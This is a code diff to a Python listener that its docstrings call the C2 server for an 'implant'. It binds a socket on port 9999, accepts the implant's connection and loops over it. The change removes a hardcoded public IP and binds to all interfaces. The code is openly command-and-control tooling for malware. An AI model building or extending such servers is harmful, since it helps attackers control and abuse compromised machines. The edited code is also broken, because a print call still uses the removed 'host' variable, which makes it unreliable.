@@ -1,11 +1,11 @@
 import socket
 import base64
 
-def connect_to_implant( server_socket , host , port ):
+def connect_to_implant( server_socket , port ):
     '''
     Accept connection from implant and connect
     '''
-    server_socket.bind( ( host , port ) )
+    server_socket.bind(('0.0.0.0', port))
     server_socket.listen( 1 )
     print( "Listening for connection on {}:{}".format( host, port ) )
     conn, addr = server_socket.accept()
@@ -33,11 +33,10 @@ def main():
     '''
     Main entry function for C2
     '''
-    host = '44.222.229.236'
     port = 9999
 
     with socket.socket() as server_socket:
-        conn, addr = connect_to_implant( server_socket , host , port )
+        conn, addr = connect_to_implant( server_socket , port )
         with conn:
             print( "Connected by", addr )
             while True:
